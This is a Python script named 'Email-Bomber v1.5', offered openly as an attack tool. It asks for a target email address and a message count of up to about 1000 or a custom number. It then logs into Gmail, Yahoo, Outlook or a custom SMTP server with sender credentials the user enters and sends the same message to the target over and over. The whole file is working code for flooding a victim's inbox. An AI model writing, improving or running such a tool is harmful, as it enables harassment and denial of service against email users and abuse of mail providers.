import sys
import smtplib
import time

class Bcolors:
    RED = '\u001b[31m'
    GREEN = ' \u001b[32m'
    YELLOW = '\u001b[33m'



def banner():
    print(Bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(Bcolors.GREEN + '+[+[+[ Email-Bomber v1.5 ]+]+]+')
    print(Bcolors.GREEN + '''

            █████                 ██
            ██▒▒██                ██
            ██  ██        ██   ██ ██        
            █████▒  ████  ███ ███ █████         
            ██▒▒██ ██  ██ ██▒█▒██ ██▒▒██        Auther: Abhijit Dey
            ██  ██ ██  ██ ██ ▒ ██ ██  ██
            █████▒ ▒████▒ ██   ██ █████▒
            ▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒
                                         
                                         ''')

                                                    

class Email_Bomber():

    count = 0

    def __init__(self):
        try:
            print(Bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = input(Bcolors.GREEN + 'Enter the Target Email Address <: ') 
            self.mode = int(input(Bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
        
            if self.mode > 4 or self.mode < 1:
                print(Bcolors.RED + 'ERROR: Invalid Option. GoodBye.')
                sys.exit(1)

        except Exception as e:
            print(Bcolors.RED + f'Exeption: {e}')
    

    def  bomber(self):
        print(Bcolors.RED + '\n+[+[+[ Setting Up Bomb ]+]+]+')
        self.amount = None
        try:
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(Bcolors.GREEN + 'Enter Your Custom Amount <: '))
                if self.amount <=  2000:
                    print(Bcolors.YELLOW + f'You have selected the Bomb Mode: {self.mode} and the Amount: {self.amount}')
                else:
                    print(Bcolors.RED + 'Please Enter an Amount less then 2000')
        
        except Exception as e:
            print(Bcolors.RED + f'Error: {e}')

    def email(self):
        try:
            print(Bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = int(input(Bcolors.GREEN + 'Enter email server - 0: | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = [1, 2, 3]
            default_port = True

            if self.server not in premade:
                default_port = False
                if self.server == 0:
                    self.server = input(Bcolors.GREEN + 'Enter External server <:').lower()
                    self.port = int(input(Bcolors.GREEN + 'Enter the Port Number <: '))
            
            if default_port == True:
                self.port = 587

            if self.server == 1:
                self.server = 'smtp.gmail.com'
            elif self.server == 2:
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == 3:
                self.server = 'smtp-mail.outlook.com'
            elif (self.server > 4 or 1 < self.server):
                print(Bcolors.RED + 'Please enter a valid Option')
            
            self.fromAddrs = input(Bcolors.GREEN + 'Enter from address <: ')
            self.fromPsswd = input(Bcolors.GREEN + 'Enter from Password <: ')
            self.subject = input(Bcolors.GREEN + 'Enter Subject <: ')
            self.message = input(Bcolors.GREEN + 'Enter Message <: ')

            self.msg = '''\nFrom: %s\nTo: %s\nSubject: %s\n %s\n
            ''' % (self.fromAddrs, self.target, self.subject, self.message)
        
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddrs, self.fromPsswd)

        except Exception as e:
            print(Bcolors.RED + f'Error: {e}')
    
    def send(self):
        try:
            self.s.sendmail(self.fromAddrs, self.target, self.msg)
            self.count += 1
            print(Bcolors.YELLOW + f'{self.count}')

        except Exception as e:
            print(Bcolors.RED + f'Error: {e}')

    def attack(self):
        try:
            print(Bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
            for _ in range(self.amount + 1):
                self.send() # self will be replaced by bomb {bomb.send()}
                time.sleep(3)
            
            self.s.close()
            
            print(Bcolors.YELLOW + '\n+[+[+[ Attack finished ]+]+]+')
            sys.exit(0)

        except Exception as e:
            print(Bcolors.RED + f'Error: {e}')


if __name__ == '__main__':
    banner()

    bomb = Email_Bomber()
    bomb.bomber()
    bomb.email()
    bomb.attack()


